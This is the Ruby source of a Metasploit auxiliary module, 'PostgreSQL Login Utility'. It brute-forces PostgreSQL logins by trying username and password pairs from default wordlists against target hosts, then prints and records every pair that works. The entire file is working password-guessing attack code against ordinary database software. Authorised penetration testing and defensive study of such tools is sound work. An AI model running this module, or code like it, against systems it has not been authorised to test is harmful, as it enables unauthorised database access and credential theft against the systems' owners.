##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Postgres
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # Creates an instance of this module.
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PostgreSQL Login Utility',
      'Description'    => %q{
        This module attempts to authenticate against a PostgreSQL
        instance using username and password combinations indicated
        by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
      },
      'Author'         => [ 'todb' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.postgresql.org' ],
          [ 'CVE', '1999-0502'] # Weak password
        ]
    ))

    register_options(
      [
        OptPath.new('USERPASS_FILE',  [ false, "File containing (space-seperated) users and passwords, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_userpass.txt") ]),
        OptPath.new('USER_FILE',      [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_user.txt") ]),
        OptPath.new('PASS_FILE',      [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_pass.txt") ]),
      ], self.class)

    deregister_options('SQL')

  end

  # Loops through each host in turn. Note the current IP address is both
  # ip and datastore['RHOST']
  def run_host(ip)
      each_user_pass { |user, pass|
        datastore['USERNAME'] = user
        datastore['PASSWORD'] = pass
        do_login(user,pass)
      }
  end

  # Alias for RHOST
  def rhost
    datastore['RHOST']
  end

  # Alias for RPORT
  def rport
    datastore['RPORT']
  end

  # Actually do all the login stuff. Note that "verbose" is really pretty
  # verbose, since postgres_login also makes use of the verbose value
  # to print diagnostics for other modules.
  def do_login(user=nil,pass=nil)
    database = datastore['DATABASE']
    begin
      msg = "#{rhost}:#{rport} Postgres -"
      vprint_status("#{msg} Trying username:'#{user}' with password:'#{pass}' on database '#{database}'")
      # Here's where the actual connection happens.
      result = postgres_login(
        :db => database,
        :username => user,
        :password => pass
      )
      case result
      when :error_database
        print_good("#{msg} Success: #{user}:#{pass} (Database '#{database}' failed.)")
        do_report_auth_info(user,pass,database,false)
        return :next_user # This is a success for user:pass!
      when :error_credentials
        vprint_error("#{msg} Username/Password failed.")
        return :failed
      when :connected
        print_good("#{msg} Success: #{user}:#{pass} (Database '#{database}' succeeded.)")
        do_report_auth_info(user,pass,database,true)
        postgres_logout
        return :next_user
      when :error
        vprint_error("#{msg} Unknown error encountered, giving up on host")
        return :done
      end
    rescue Rex::ConnectionError
      vprint_error "#{rhost}:#{rport} Connection Error: #{$!}"
      return :done
    end
  end

  # Report the service state
  def do_report_postgres
    report_service(
      :host => rhost,
      :port => rport,
      :name => "postgres"
    )
  end

  def do_report_auth_info(user,pass,db,db_ok)
    do_report_postgres

    result_hash = {
      :host => rhost,
      :port => rport,
      :sname => "postgres",
      :user => user,
      :pass => pass,
      :source_type => "user_supplied",
      :active => true
    }
    result_hash[:user] = "#{db}/#{user}" if db_ok
    report_auth_info result_hash
  end

end
